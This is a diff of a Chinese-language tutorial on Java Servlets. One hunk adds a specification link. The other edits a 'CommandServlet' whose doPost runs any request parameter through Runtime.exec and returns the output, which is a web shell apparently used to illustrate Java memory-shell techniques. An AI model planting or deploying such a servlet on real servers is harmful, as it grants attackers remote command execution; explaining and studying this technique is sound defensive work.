@@ -4,7 +4,7 @@ Java SE 中我们可以创建 socket 服务端为用户提供服务，但需要�
 
 Servlet 规范旨在让开发者基于规范开发的应用，可以部署在任意满足规范的 Web 容器上。每个 Servlet 规范版本都引入了一些新的东西，Servlet 4.0 前的版本变更可查看 [java-servlet-version-history](https://www.codejava.net/java-ee/servlet/java-servlet-version-history)。
 
-目前常见的 Servlet 规范就是 [Servlet 3.1](https://github.com/waylau/servlet-3.1-specification/blob/master/docs), Tomcat 8.x 版本就是 Servlet 3.1 版本，从 Servlet 5.0 开始，Java EE 更名为 Jakarta EE，包路径从 javax 改为 jakarta。目前最新的 Servlet 规范是 Servlet 6.1。另外可以 [在此](https://tomcat.apache.org/whichversion.html) 查看 Tomcat 容器支持的 Servlet 规范版本。
+目前常见的 Servlet 规范就是 [Servlet 3.1](https://github.com/waylau/servlet-3.1-specification/blob/master/docs), Tomcat 8.x 版本就是 Servlet 3.1 版本，从 Servlet 5.0 开始，Java EE 更名为 Jakarta EE，包路径从 javax 改为 jakarta。目前最新的 Servlet 规范是 [Servlet 6.1](https://jakarta.ee/zh/specifications/servlet/6.1/)。另外可以 [在此](https://tomcat.apache.org/whichversion.html) 查看 Tomcat 容器支持的 Servlet 规范版本。
 
 ## ServletContext
 
@@ -82,19 +82,16 @@ public class CommandServlet extends HttpServlet {
 
     @Override
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-        try {
-            String cmd = request.getParameter(paramName);
-            if (cmd != null) {
-                Process exec = Runtime.getRuntime().exec(cmd);
-                InputStream inputStream = exec.getInputStream();
-                ServletOutputStream outputStream = response.getOutputStream();
-                byte[] buf = new byte[8192];
-                int length;
-                while ((length = inputStream.read(buf)) != -1) {
-                    outputStream.write(buf, 0, length);
-                }
+        String cmd = request.getParameter(paramName);
+        if (cmd != null) {
+            Process exec = Runtime.getRuntime().exec(cmd);
+            InputStream inputStream = exec.getInputStream();
+            ServletOutputStream outputStream = response.getOutputStream();
+            byte[] buf = new byte[8192];
+            int length;
+            while ((length = inputStream.read(buf)) != -1) {
+                outputStream.write(buf, 0, length);
             }
-        } catch (Exception ignored) {
         }
     }
 }
